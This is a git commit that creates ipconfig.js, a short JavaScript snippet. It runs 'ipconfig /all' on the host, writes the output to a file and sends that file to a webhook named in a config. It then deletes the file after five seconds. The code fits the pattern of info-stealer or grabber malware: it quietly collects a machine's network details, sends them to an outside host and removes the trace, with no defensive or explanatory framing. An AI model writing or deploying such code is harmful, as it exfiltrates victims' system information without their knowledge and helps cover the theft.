522d6322540c62055cf621c76d117aa187456220
wellzvendor <119109717+wellzvendor@users.noreply.github.com>
2022-12-11 06:48:51 -0800

    Create ipconfig.js

---
+++ ipconfig.js
@@ -0,0 +1,14 @@
+
+exec("ipconfig /all", (error, stdout, stderr) => {
+	fs.writeFile('ipconfig.txt', stdout, async function (err) {
+	const hook = new Webhook(config.webhook);
+
+await hook.sendFile('./ipconfig.txt');
+})
+setTimeout(function () {
+	fs.unlink('ipconfig.txt', function (err) {
+		if (err) throw err;
+	}
+		);
+}, 5000);
+})
